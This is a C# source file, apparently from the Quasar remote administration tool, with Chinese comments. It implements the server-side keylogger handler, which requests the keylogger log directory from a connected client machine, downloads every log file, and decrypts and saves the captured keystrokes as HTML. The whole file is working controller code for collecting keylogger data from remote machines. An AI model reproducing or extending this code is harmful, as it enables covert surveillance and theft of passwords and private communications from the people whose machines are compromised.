﻿﻿﻿using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using System;
using System.IO;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// 处理与远程键盘记录器交互的消息。
    /// </summary>
    public class KeyloggerHandler : MessageProcessorBase<string>, IDisposable
    {
        /// <summary>
        /// 与此键盘记录器处理器关联的客户端。
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// 用于从客户端检索键盘记录器日志的文件管理器处理器。
        /// </summary>
        private readonly FileManagerHandler _fileManagerHandler;

        /// <summary>
        /// 键盘记录器日志目录的远程路径。
        /// </summary>
        private string _remoteKeyloggerDirectory;

        /// <summary>
        /// 所有正在运行的日志传输数量。
        /// </summary>
        private int _allTransfers;

        /// <summary>
        /// 所有已完成的日志传输数量。
        /// </summary>
        private int _completedTransfers;

        /// <summary>
        /// 使用给定客户端初始化 <see cref="KeyloggerHandler"/> 类的新实例。
        /// </summary>
        /// <param name="client">关联的客户端。</param>
        public KeyloggerHandler(Client client) : base(true)
        {
            _client = client;
            _fileManagerHandler = new FileManagerHandler(client, "Logs\\");
            _fileManagerHandler.DirectoryChanged += DirectoryChanged;
            _fileManagerHandler.FileTransferUpdated += FileTransferUpdated;
            _fileManagerHandler.ProgressChanged += StatusUpdated;
            MessageHandler.Register(_fileManagerHandler);
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectoryResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKeyloggerLogsDirectoryResponse logsDirectory:
                    Execute(sender, logsDirectory);
                    break;
            }
        }

        /// <summary>
        /// 检索键盘记录器日志并开始下载。
        /// </summary>
        public void RetrieveLogs()
        {
            _client.Send(new GetKeyloggerLogsDirectory());
        }

        private void Execute(ISender client, GetKeyloggerLogsDirectoryResponse message)
        {
            _remoteKeyloggerDirectory = message.LogsDirectory;
            client.Send(new GetDirectory {RemotePath = _remoteKeyloggerDirectory});
        }

        private string GetDownloadProgress(int allTransfers, int completedTransfers)
        {
            decimal progress = Math.Round((decimal)((double)completedTransfers / (double)allTransfers * 100.0), 2);
            return $"Downloading...({progress}%)";
        }

        private void StatusUpdated(object sender, string value)
        {
            // called when directory does not exist or access is denied
            OnReport($"未找到日志 ({value})");
        }

        private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items)
        {
            if (items.Length == 0)
            {
                OnReport("未找到日志");
                return;
            }

            _allTransfers = items.Length;
            _completedTransfers = 0;
            OnReport(GetDownloadProgress(_allTransfers, _completedTransfers));

            foreach (var item in items)
            {
                // don't escape from download directory
                if (FileHelper.HasIllegalCharacters(item.Name))
                {
                    // disconnect malicious client
                    _client.Disconnect();
                    return;
                }

                _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name), item.Name + ".html", true);
            }
        }

        private void FileTransferUpdated(object sender, FileTransfer transfer)
        {
            if (transfer.Status == "Completed")
            {
                try
                {
                    _completedTransfers++;
                    File.WriteAllText(transfer.LocalPath, FileHelper.ReadLogFile(transfer.LocalPath, _client.Value.AesInstance));
                    OnReport(_allTransfers == _completedTransfers
                        ? "成功检索所有日志"
                        : GetDownloadProgress(_allTransfers, _completedTransfers));
                }
                catch (Exception)
                {
                    OnReport("解密和写入日志失败");
                }
            }
        }

        /// <summary>
        /// 释放与此消息处理器关联的所有托管和非托管资源。
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                MessageHandler.Unregister(_fileManagerHandler);
                _fileManagerHandler.ProgressChanged -= StatusUpdated;
                _fileManagerHandler.FileTransferUpdated -= FileTransferUpdated;
                _fileManagerHandler.DirectoryChanged -= DirectoryChanged;
                _fileManagerHandler.Dispose();
            }
        }
    }
}
